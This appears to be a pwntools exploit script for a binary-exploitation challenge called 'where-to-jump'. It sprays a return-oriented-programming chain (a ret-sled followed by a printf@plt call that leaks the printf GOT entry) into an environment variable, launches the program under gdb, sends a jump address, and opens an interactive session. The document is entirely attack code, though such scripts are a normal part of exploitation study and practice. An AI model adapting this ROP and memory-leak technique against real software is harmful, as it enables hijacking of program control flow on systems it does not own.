#!/usr/bin/env python

from pwn import *

ROP_NOPS = p32(0x804833e) * 1000

elf = ELF('where-to-jump')

printf_got = elf.got['printf']
printf_plt = elf.plt['printf']
pr = 0x8048355
ppr = 0x80485ba
pppr = 0x80485b9

rop = ROP_NOPS
rop += p32(printf_plt)
rop += p32(pr)
rop += p32(printf_got)

print(hex(printf_got))
print(hex(printf_plt))

env = {
    'G' : 'ABC',
    'S' : rop * (70000/len(rop))
}

p = process('where-to-jump', env=env)

gdb.attach(p, "b *target+94\nc")

#raw_input()
p.recv(timeout=0.2)
p.sendline("804843e")
data = p.recv()
print(repr(data))
data = p.recv()
print(repr(data))

p.interactive()
